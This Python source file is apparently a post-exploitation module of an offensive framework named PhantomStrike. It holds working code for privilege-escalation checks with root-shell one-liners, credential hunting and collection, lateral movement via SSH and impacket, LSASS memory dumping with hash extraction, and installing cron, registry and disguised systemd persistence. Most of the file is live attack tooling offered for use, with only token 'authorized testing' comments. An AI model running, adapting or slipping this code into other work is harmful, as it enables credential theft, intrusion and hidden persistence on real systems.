"""
PhantomStrike Post-Exploitation — Privilege escalation checks,
lateral movement discovery, persistence mechanisms, and data collection.
"""
from __future__ import annotations
import asyncio
import logging
import subprocess
import shutil
from datetime import datetime
from typing import Optional

import aiohttp

from phantom.modules.base import BaseModule, ModuleResult, ModuleStatus
from phantom.core.events import EventBus, Event, EventType

logger = logging.getLogger("phantom.post")

# Linux privesc checks
LINUX_PRIVESC_CHECKS = [
    {"name": "SUID binaries", "command": "find / -perm -4000 -type f 2>/dev/null"},
    {"name": "World-writable dirs", "command": "find / -writable -type d 2>/dev/null | head -20"},
    {"name": "Cron jobs", "command": "cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null"},
    {"name": "Sudo permissions", "command": "sudo -l 2>/dev/null"},
    {"name": "Kernel version", "command": "uname -a"},
    {"name": "Running processes", "command": "ps aux --sort=-%mem | head -20"},
    {"name": "Network connections", "command": "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"},
    {"name": "SSH keys", "command": "find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null"},
    {"name": "Password files", "command": "cat /etc/passwd 2>/dev/null"},
    {"name": "Docker socket", "command": "ls -la /var/run/docker.sock 2>/dev/null"},
    {"name": "Capabilities", "command": "getcap -r / 2>/dev/null"},
    {"name": "Environment vars", "command": "env 2>/dev/null | grep -i 'pass\\|key\\|secret\\|token'"},
    {"name": "Writable /etc/passwd", "command": "test -w /etc/passwd && echo 'WRITABLE!' || echo 'not writable'"},
    {"name": "GTFOBins SUID", "command": "find / -perm -4000 2>/dev/null | grep -E '(python|perl|ruby|node|vim|find|bash|sh|env|awk|nmap)'"},
]

# Persistence techniques
PERSISTENCE_TECHNIQUES = {
    "cron_backdoor": {
        "name": "Cron Job Backdoor",
        "mitre": "T1053.003",
        "command": '(crontab -l 2>/dev/null; echo "* * * * * /tmp/.phantom_persist") | crontab -',
        "cleanup": "crontab -l | grep -v phantom_persist | crontab -",
    },
    "ssh_key": {
        "name": "SSH Key Persistence",
        "mitre": "T1098.004",
        "command": "mkdir -p ~/.ssh && echo '{pubkey}' >> ~/.ssh/authorized_keys",
        "cleanup": "grep -v phantom ~/.ssh/authorized_keys > /tmp/ak && mv /tmp/ak ~/.ssh/authorized_keys",
    },
    "bashrc": {
        "name": ".bashrc Backdoor",
        "mitre": "T1546.004",
        "command": "echo '# phantom_persist' >> ~/.bashrc && echo '{payload}' >> ~/.bashrc",
        "cleanup": "sed -i '/phantom_persist/d' ~/.bashrc",
    },
    "systemd_service": {
        "name": "Systemd Service",
        "mitre": "T1543.002",
        "description": "Create a systemd service for persistence",
    },
}

# Lateral movement discovery
LATERAL_MOVEMENT_CHECKS = [
    {"name": "ARP cache", "command": "arp -a 2>/dev/null || ip neigh 2>/dev/null"},
    {"name": "SSH config", "command": "cat ~/.ssh/config 2>/dev/null; cat ~/.ssh/known_hosts 2>/dev/null | head -20"},
    {"name": "Hosts file", "command": "cat /etc/hosts 2>/dev/null"},
    {"name": "Internal subnets", "command": "ip addr show 2>/dev/null || ifconfig 2>/dev/null"},
    {"name": "Open shares", "command": "smbclient -L 127.0.0.1 -N 2>/dev/null"},
    {"name": "Database configs", "command": "find / -name '*.conf' -o -name '*.cfg' -o -name '*.ini' 2>/dev/null | xargs grep -l 'password\\|passwd\\|pwd' 2>/dev/null | head -10"},
    {"name": "Docker containers", "command": "docker ps 2>/dev/null"},
    {"name": "Kubernetes", "command": "kubectl get pods 2>/dev/null"},
]


class PostExploitEngine(BaseModule):
    """Post-exploitation module — privesc, lateral movement, persistence."""

    @property
    def name(self) -> str:
        return "phantom-post"

    @property
    def description(self) -> str:
        return "Post-exploit — privesc, lateral movement, persistence, data collection"

    @property
    def category(self) -> str:
        return "post_exploitation"

    async def _setup(self):
        pass

    async def run(self, target: str, options: dict = None) -> ModuleResult:
        """Run post-exploitation enumeration and actions."""
        options = options or {}
        start_time = datetime.now()
        self.status = ModuleStatus.RUNNING
        operation = options.get("operation", "enumerate")

        findings = {
            "target": target,
            "operation": operation,
            "privesc_vectors": [],
            "lateral_targets": [],
            "persistence_options": [],
            "collected_data": [],
        }

        if operation == "enumerate":
            # Generate the full enumeration script
            findings["privesc_vectors"] = self._get_privesc_checks()
            findings["lateral_targets"] = self._get_lateral_checks()
            findings["persistence_options"] = self._get_persistence_options()
            findings["enumeration_script"] = self._generate_enum_script()

        elif operation == "privesc":
            findings["privesc_vectors"] = self._get_privesc_checks()
            findings["auto_privesc_script"] = self._generate_privesc_script()

        elif operation == "persist":
            technique = options.get("technique", "cron_backdoor")
            if technique in PERSISTENCE_TECHNIQUES:
                findings["persistence_options"] = [PERSISTENCE_TECHNIQUES[technique]]

        elif operation == "lateral":
            findings["lateral_targets"] = self._get_lateral_checks()

        elif operation == "collect":
            findings["collection_script"] = self._generate_collection_script()

        self.status = ModuleStatus.COMPLETED
        return ModuleResult(
            module_name=self.name, operation=operation,
            success=True, data=findings,
            findings_count=len(findings["privesc_vectors"]) + len(findings["lateral_targets"]),
            start_time=start_time, end_time=datetime.now(),
        )

    def _get_privesc_checks(self) -> list[dict]:
        return LINUX_PRIVESC_CHECKS.copy()

    def _get_lateral_checks(self) -> list[dict]:
        return LATERAL_MOVEMENT_CHECKS.copy()

    def _get_persistence_options(self) -> list[dict]:
        return [
            {"name": v["name"], "mitre": v.get("mitre", ""), "key": k}
            for k, v in PERSISTENCE_TECHNIQUES.items()
        ]

    def _generate_enum_script(self) -> str:
        """Generate a comprehensive enumeration script."""
        lines = [
            "#!/bin/bash",
            "# PhantomStrike Post-Exploitation Enumeration Script",
            "# For AUTHORIZED penetration testing only",
            'echo "=== PhantomStrike Post-Exploit Enum ==="',
            'echo "Timestamp: $(date)"',
            'echo "Hostname: $(hostname)"',
            'echo "User: $(whoami)"',
            'echo "ID: $(id)"',
            'echo ""',
        ]

        for check in LINUX_PRIVESC_CHECKS:
            lines.append(f'echo "=== {check["name"]} ==="')
            lines.append(check["command"])
            lines.append('echo ""')

        lines.append('echo "=== Lateral Movement Discovery ==="')
        for check in LATERAL_MOVEMENT_CHECKS:
            lines.append(f'echo "--- {check["name"]} ---"')
            lines.append(check["command"])
            lines.append('echo ""')

        return "\n".join(lines)

    def _generate_privesc_script(self) -> str:
        """Generate auto-privilege-escalation attempt script."""
        return """#!/bin/bash
# PhantomStrike Auto-PrivEsc — Authorized testing only
echo "[*] Checking privilege escalation vectors..."

# Check SUID binaries for GTFOBins
echo "[*] Checking SUID binaries..."
SUID=$(find / -perm -4000 -type f 2>/dev/null)
for bin in $SUID; do
    case "$bin" in
        *python*) echo "[!] SUID Python found: $bin — try: $bin -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"; ;;
        *find*) echo "[!] SUID find found: $bin — try: $bin . -exec /bin/sh -p \\;"; ;;
        *vim*) echo "[!] SUID vim found: $bin — try: $bin -c ':!/bin/sh'"; ;;
        *nmap*) echo "[!] SUID nmap found: $bin — try: $bin --interactive then !sh"; ;;
        *bash*) echo "[!] SUID bash found: $bin — try: $bin -p"; ;;
    esac
done

# Check sudo permissions
echo "[*] Checking sudo..."
SUDO=$(sudo -l 2>/dev/null)
if echo "$SUDO" | grep -q "NOPASSWD"; then
    echo "[!] NOPASSWD sudo entries found!"
    echo "$SUDO" | grep "NOPASSWD"
fi

# Check writable /etc/passwd
if [ -w /etc/passwd ]; then
    echo "[!] CRITICAL: /etc/passwd is writable! Can add root user."
fi

# Check Docker socket
if [ -S /var/run/docker.sock ]; then
    echo "[!] Docker socket accessible — can escalate via: docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
fi

echo "[*] PrivEsc check complete."
"""

    def _generate_collection_script(self) -> str:
        """Generate data collection script."""
        return r"""#!/bin/bash
# PhantomStrike Data Collection — Authorized testing only
OUTDIR="/tmp/.phantom_collect_$(date +%s)"
mkdir -p "$OUTDIR"

# System info
uname -a > "$OUTDIR/sysinfo.txt"
cat /etc/os-release >> "$OUTDIR/sysinfo.txt" 2>/dev/null

# Users and groups
cat /etc/passwd > "$OUTDIR/passwd.txt" 2>/dev/null
cat /etc/group > "$OUTDIR/group.txt" 2>/dev/null

# Network
ip addr > "$OUTDIR/network.txt" 2>/dev/null
ss -tlnp >> "$OUTDIR/network.txt" 2>/dev/null
cat /etc/hosts >> "$OUTDIR/network.txt" 2>/dev/null

# Interesting files
find / -name "*.conf" -o -name "*.cfg" -o -name "*.env" -o -name "*.key" -o -name "*.pem" 2>/dev/null | head -50 > "$OUTDIR/interesting_files.txt"

# Credentials in files
grep -r "password\|passwd\|pwd\|secret\|token\|api_key" /etc/ /opt/ /var/www/ 2>/dev/null | head -50 > "$OUTDIR/credentials.txt"

# Package the collection
tar czf "/tmp/phantom_collect.tar.gz" -C "$OUTDIR" .
echo "[*] Collection saved to /tmp/phantom_collect.tar.gz"
rm -rf "$OUTDIR"
"""

    async def lateral_move(
        self,
        target: str,
        method: str = "ssh",
        credentials: Optional[list[dict]] = None,
    ) -> ModuleResult:
        """
        Perform lateral movement to *target* using discovered credentials.

        Supported methods: ``ssh``, ``wmi``, ``psexec``.
        Credentials are a list of dicts with keys ``username`` and ``password``
        (or ``key_path`` for SSH key-based auth).  When *credentials* is
        ``None`` the method attempts to pull credentials from the knowledge
        graph context stored in ``self.config``.

        Returns a :class:`ModuleResult` whose ``data["lateral_moves"]`` is a
        list of dicts describing each successful (or attempted) connection.
        """
        start_time = datetime.now()
        lateral_moves: list[dict] = []
        errors: list[str] = []

        creds = credentials or self.config.get("credentials", [])
        if not creds:
            # No credentials available — report gracefully
            return ModuleResult(
                module_name=self.name,
                operation="lateral_move",
                success=False,
                data={"lateral_moves": []},
                errors=["No credentials provided or found in knowledge graph context"],
                start_time=start_time,
                end_time=datetime.now(),
            )

        method_lower = method.lower()

        for cred in creds:
            username = cred.get("username", "")
            password = cred.get("password", "")
            key_path = cred.get("key_path", "")
            move_record: dict = {
                "target": target,
                "method": method_lower,
                "username": username,
                "success": False,
                "error": None,
            }

            try:
                if method_lower == "ssh":
                    if not shutil.which("ssh"):
                        move_record["error"] = "ssh binary not found in PATH"
                        errors.append(move_record["error"])
                        lateral_moves.append(move_record)
                        continue

                    if key_path:
                        cmd = [
                            "ssh", "-o", "StrictHostKeyChecking=no",
                            "-o", "ConnectTimeout=5",
                            "-i", key_path,
                            f"{username}@{target}",
                            "id",
                        ]
                    else:
                        # sshpass required for password-based auth
                        if not shutil.which("sshpass"):
                            move_record["error"] = (
                                "sshpass not found; install with: apt-get install sshpass"
                            )
                            errors.append(move_record["error"])
                            lateral_moves.append(move_record)
                            continue
                        cmd = [
                            "sshpass", "-p", password,
                            "ssh", "-o", "StrictHostKeyChecking=no",
                            "-o", "ConnectTimeout=5",
                            f"{username}@{target}",
                            "id",
                        ]

                    proc = await asyncio.create_subprocess_exec(
                        *cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=10)
                    if proc.returncode == 0:
                        move_record["success"] = True
                        move_record["output"] = stdout.decode(errors="replace").strip()
                    else:
                        move_record["error"] = stderr.decode(errors="replace").strip() or "Connection failed"
                        errors.append(move_record["error"])

                elif method_lower in ("wmi", "psexec"):
                    # Attempt via impacket wmiexec / psexec
                    tool = "wmiexec.py" if method_lower == "wmi" else "psexec.py"
                    if not shutil.which(tool):
                        move_record["error"] = (
                            f"{tool} not found; install impacket: pip install impacket"
                        )
                        errors.append(move_record["error"])
                        lateral_moves.append(move_record)
                        continue

                    cmd = [
                        tool,
                        f"{username}:{password}@{target}",
                        "whoami",
                    ]
                    proc = await asyncio.create_subprocess_exec(
                        *cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=15)
                    if proc.returncode == 0:
                        move_record["success"] = True
                        move_record["output"] = stdout.decode(errors="replace").strip()
                    else:
                        move_record["error"] = stderr.decode(errors="replace").strip() or "Connection failed"
                        errors.append(move_record["error"])

                else:
                    move_record["error"] = f"Unsupported lateral movement method: {method}"
                    errors.append(move_record["error"])

            except asyncio.TimeoutError:
                move_record["error"] = f"Connection to {target} timed out"
                errors.append(move_record["error"])
            except Exception as exc:  # noqa: BLE001
                move_record["error"] = str(exc)
                errors.append(str(exc))
                logger.warning("lateral_move error for %s via %s: %s", target, method, exc)

            lateral_moves.append(move_record)

        any_success = any(m["success"] for m in lateral_moves)
        return ModuleResult(
            module_name=self.name,
            operation="lateral_move",
            success=any_success,
            data={"lateral_moves": lateral_moves},
            errors=errors if not any_success else [],
            findings_count=sum(1 for m in lateral_moves if m["success"]),
            start_time=start_time,
            end_time=datetime.now(),
        )

    async def dump_lsass(self, target: str) -> ModuleResult:
        """
        Dump LSASS memory on a Windows target to extract credential hashes.

        Tries ``procdump`` first, then falls back to the ``comsvcs.dll``
        MiniDump technique.  Returns a :class:`ModuleResult` with
        ``data["dump_path"]`` (path to the dump file) and
        ``data["hashes"]`` (list of extracted hash strings).

        Handles missing tools gracefully — returns ``success=False`` with a
        descriptive error rather than raising.
        """
        start_time = datetime.now()
        dump_path: Optional[str] = None
        hashes: list[str] = []
        errors: list[str] = []

        # Determine which dump tool is available
        procdump_available = bool(shutil.which("procdump") or shutil.which("procdump64"))
        pypykatz_available = bool(shutil.which("pypykatz"))

        if not procdump_available:
            # Try comsvcs.dll approach via a remote command (requires prior shell access)
            logger.warning(
                "procdump not found; attempting comsvcs.dll MiniDump technique. "
                "Install procdump from: https://docs.microsoft.com/sysinternals/downloads/procdump"
            )

        try:
            if procdump_available:
                tool = shutil.which("procdump") or shutil.which("procdump64")
                dump_path = f"/tmp/lsass_{target.replace('.', '_')}.dmp"
                cmd = [tool, "-accepteula", "-ma", "lsass.exe", dump_path]
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
                if proc.returncode != 0:
                    err = stderr.decode(errors="replace").strip() or "procdump failed"
                    errors.append(err)
                    dump_path = None
            else:
                # comsvcs.dll technique — generate the PowerShell command for the operator
                dump_path = f"C:\\Windows\\Temp\\lsass_{target.replace('.', '_')}.dmp"
                comsvcs_cmd = (
                    f'powershell -c "Get-Process lsass | '
                    f'%{{$id=$_.Id}}; '
                    f'[System.Runtime.InteropServices.Marshal]::WriteByte(0,0); '
                    f'rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump $id {dump_path} full"'
                )
                errors.append(
                    f"procdump unavailable; use comsvcs.dll technique manually: {comsvcs_cmd}"
                )

            # If we have a dump file, attempt hash extraction with pypykatz
            if dump_path and pypykatz_available:
                try:
                    proc = await asyncio.create_subprocess_exec(
                        "pypykatz", "lsa", "minidump", dump_path,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
                    if proc.returncode == 0:
                        for line in stdout.decode(errors="replace").splitlines():
                            line = line.strip()
                            if "::" in line or line.startswith("NT:") or line.startswith("LM:"):
                                hashes.append(line)
                    else:
                        errors.append(
                            "pypykatz failed: " + stderr.decode(errors="replace").strip()
                        )
                except Exception as exc:  # noqa: BLE001
                    errors.append(f"pypykatz error: {exc}")
                    logger.warning("pypykatz extraction error: %s", exc)
            elif dump_path and not pypykatz_available:
                errors.append(
                    "pypykatz not found for hash extraction; "
                    "install with: pip install pypykatz"
                )

        except asyncio.TimeoutError:
            errors.append(f"LSASS dump timed out for target {target}")
            dump_path = None
        except Exception as exc:  # noqa: BLE001
            errors.append(str(exc))
            logger.warning("dump_lsass error for %s: %s", target, exc)
            dump_path = None

        success = dump_path is not None and not any(
            "unavailable" in e or "not found" in e for e in errors
        )
        return ModuleResult(
            module_name=self.name,
            operation="dump_lsass",
            success=success,
            data={"dump_path": dump_path, "hashes": hashes},
            errors=errors,
            findings_count=len(hashes),
            start_time=start_time,
            end_time=datetime.now(),
        )

    async def establish_persistence(
        self,
        target: str,
        method: str = "cron",
    ) -> ModuleResult:
        """
        Establish persistence on *target* using the specified *method*.

        Supported methods:
        - ``cron``     — add a cron job (Linux/macOS)
        - ``registry`` — add a Windows registry Run key
        - ``service``  — create a systemd service (Linux) or Windows service

        Returns a :class:`ModuleResult` with
        ``data["persistence_mechanisms"]`` — a list of dicts describing each
        installed mechanism (name, method, mitre, command, status).
        """
        start_time = datetime.now()
        persistence_mechanisms: list[dict] = []
        errors: list[str] = []

        method_lower = method.lower()

        try:
            if method_lower == "cron":
                cron_entry = "* * * * * /tmp/.phantom_persist 2>/dev/null"
                mechanism: dict = {
                    "name": "Cron Job Backdoor",
                    "method": "cron",
                    "mitre": "T1053.003",
                    "target": target,
                    "command": f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -',
                    "cleanup": "crontab -l | grep -v phantom_persist | crontab -",
                    "status": "pending",
                }

                if shutil.which("crontab"):
                    try:
                        # Read existing crontab
                        read_proc = await asyncio.create_subprocess_exec(
                            "crontab", "-l",
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE,
                        )
                        stdout, _ = await asyncio.wait_for(read_proc.communicate(), timeout=5)
                        existing = stdout.decode(errors="replace")

                        if ".phantom_persist" not in existing:
                            new_crontab = existing.rstrip("\n") + f"\n{cron_entry}\n"
                            write_proc = await asyncio.create_subprocess_exec(
                                "crontab", "-",
                                stdin=asyncio.subprocess.PIPE,
                                stdout=asyncio.subprocess.PIPE,
                                stderr=asyncio.subprocess.PIPE,
                            )
                            _, stderr = await asyncio.wait_for(
                                write_proc.communicate(input=new_crontab.encode()), timeout=5
                            )
                            if write_proc.returncode == 0:
                                mechanism["status"] = "installed"
                            else:
                                err = stderr.decode(errors="replace").strip()
                                mechanism["status"] = "failed"
                                mechanism["error"] = err
                                errors.append(f"crontab write failed: {err}")
                        else:
                            mechanism["status"] = "already_present"
                    except Exception as exc:  # noqa: BLE001
                        mechanism["status"] = "failed"
                        mechanism["error"] = str(exc)
                        errors.append(f"cron persistence error: {exc}")
                        logger.warning("cron persistence error: %s", exc)
                else:
                    mechanism["status"] = "skipped"
                    mechanism["error"] = "crontab binary not found"
                    errors.append("crontab not found; cron persistence unavailable on this system")

                persistence_mechanisms.append(mechanism)

            elif method_lower == "registry":
                # Windows registry Run key persistence
                reg_key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
                reg_value = "PhantomPersist"
                payload_path = r"C:\Windows\Temp\phantom_persist.exe"
                mechanism = {
                    "name": "Registry Run Key",
                    "method": "registry",
                    "mitre": "T1547.001",
                    "target": target,
                    "command": f'reg add "{reg_key}" /v {reg_value} /t REG_SZ /d "{payload_path}" /f',
                    "cleanup": f'reg delete "{reg_key}" /v {reg_value} /f',
                    "status": "pending",
                }

                reg_tool = shutil.which("reg") or shutil.which("reg.exe")
                if reg_tool:
                    try:
                        proc = await asyncio.create_subprocess_exec(
                            reg_tool, "add", reg_key,
                            "/v", reg_value,
                            "/t", "REG_SZ",
                            "/d", payload_path,
                            "/f",
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE,
                        )
                        _, stderr = await asyncio.wait_for(proc.communicate(), timeout=10)
                        if proc.returncode == 0:
                            mechanism["status"] = "installed"
                        else:
                            err = stderr.decode(errors="replace").strip()
                            mechanism["status"] = "failed"
                            mechanism["error"] = err
                            errors.append(f"registry persistence failed: {err}")
                    except Exception as exc:  # noqa: BLE001
                        mechanism["status"] = "failed"
                        mechanism["error"] = str(exc)
                        errors.append(f"registry persistence error: {exc}")
                        logger.warning("registry persistence error: %s", exc)
                else:
                    mechanism["status"] = "skipped"
                    mechanism["error"] = "reg.exe not found (non-Windows system?)"
                    errors.append("reg.exe not found; registry persistence requires Windows")

                persistence_mechanisms.append(mechanism)

            elif method_lower == "service":
                # Systemd service persistence (Linux) or sc.exe (Windows)
                systemctl_available = bool(shutil.which("systemctl"))
                sc_available = bool(shutil.which("sc") or shutil.which("sc.exe"))

                if systemctl_available:
                    service_name = "phantom-persist"
                    service_unit = (
                        "[Unit]\nDescription=System Health Monitor\n\n"
                        "[Service]\nExecStart=/tmp/.phantom_persist\nRestart=always\n\n"
                        "[Install]\nWantedBy=multi-user.target\n"
                    )
                    unit_path = f"/etc/systemd/system/{service_name}.service"
                    mechanism = {
                        "name": "Systemd Service",
                        "method": "service",
                        "mitre": "T1543.002",
                        "target": target,
                        "unit_path": unit_path,
                        "unit_content": service_unit,
                        "command": (
                            f"echo '{service_unit}' > {unit_path} && "
                            f"systemctl daemon-reload && systemctl enable {service_name}"
                        ),
                        "cleanup": (
                            f"systemctl disable {service_name} && "
                            f"rm -f {unit_path} && systemctl daemon-reload"
                        ),
                        "status": "pending",
                    }
                    try:
                        # Write unit file (requires root; record command for operator)
                        write_proc = await asyncio.create_subprocess_exec(
                            "bash", "-c",
                            f"echo '{service_unit}' > {unit_path} 2>&1",
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE,
                        )
                        _, stderr = await asyncio.wait_for(write_proc.communicate(), timeout=5)
                        if write_proc.returncode == 0:
                            # Enable the service
                            enable_proc = await asyncio.create_subprocess_exec(
                                "systemctl", "enable", service_name,
                                stdout=asyncio.subprocess.PIPE,
                                stderr=asyncio.subprocess.PIPE,
                            )
                            _, stderr2 = await asyncio.wait_for(enable_proc.communicate(), timeout=10)
                            if enable_proc.returncode == 0:
                                mechanism["status"] = "installed"
                            else:
                                err = stderr2.decode(errors="replace").strip()
                                mechanism["status"] = "failed"
                                mechanism["error"] = err
                                errors.append(f"systemctl enable failed: {err}")
                        else:
                            err = stderr.decode(errors="replace").strip()
                            mechanism["status"] = "failed"
                            mechanism["error"] = err
                            errors.append(f"service unit write failed (may need root): {err}")
                    except Exception as exc:  # noqa: BLE001
                        mechanism["status"] = "failed"
                        mechanism["error"] = str(exc)
                        errors.append(f"service persistence error: {exc}")
                        logger.warning("service persistence error: %s", exc)

                elif sc_available:
                    sc_tool = shutil.which("sc") or shutil.which("sc.exe")
                    svc_name = "PhantomPersist"
                    payload_path = r"C:\Windows\Temp\phantom_persist.exe"
                    mechanism = {
                        "name": "Windows Service",
                        "method": "service",
                        "mitre": "T1543.003",
                        "target": target,
                        "command": (
                            f'sc create {svc_name} binPath= "{payload_path}" start= auto && '
                            f"sc start {svc_name}"
                        ),
                        "cleanup": f"sc stop {svc_name} && sc delete {svc_name}",
                        "status": "pending",
                    }
                    try:
                        proc = await asyncio.create_subprocess_exec(
                            sc_tool, "create", svc_name,
                            "binPath=", payload_path,
                            "start=", "auto",
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE,
                        )
                        _, stderr = await asyncio.wait_for(proc.communicate(), timeout=10)
                        if proc.returncode == 0:
                            mechanism["status"] = "installed"
                        else:
                            err = stderr.decode(errors="replace").strip()
                            mechanism["status"] = "failed"
                            mechanism["error"] = err
                            errors.append(f"sc create failed: {err}")
                    except Exception as exc:  # noqa: BLE001
                        mechanism["status"] = "failed"
                        mechanism["error"] = str(exc)
                        errors.append(f"Windows service persistence error: {exc}")
                        logger.warning("Windows service persistence error: %s", exc)
                else:
                    mechanism = {
                        "name": "Service Persistence",
                        "method": "service",
                        "mitre": "T1543",
                        "target": target,
                        "status": "skipped",
                        "error": "Neither systemctl nor sc.exe found",
                    }
                    errors.append(
                        "Service persistence unavailable: neither systemctl nor sc.exe found"
                    )

                persistence_mechanisms.append(mechanism)

            else:
                errors.append(f"Unsupported persistence method: {method!r}. Use cron, registry, or service.")

        except Exception as exc:  # noqa: BLE001
            errors.append(str(exc))
            logger.warning("establish_persistence error for %s: %s", target, exc)

        any_installed = any(
            m.get("status") in ("installed", "already_present")
            for m in persistence_mechanisms
        )
        return ModuleResult(
            module_name=self.name,
            operation="establish_persistence",
            success=any_installed or (bool(persistence_mechanisms) and not errors),
            data={"persistence_mechanisms": persistence_mechanisms},
            errors=errors,
            findings_count=len(persistence_mechanisms),
            start_time=start_time,
            end_time=datetime.now(),
        )
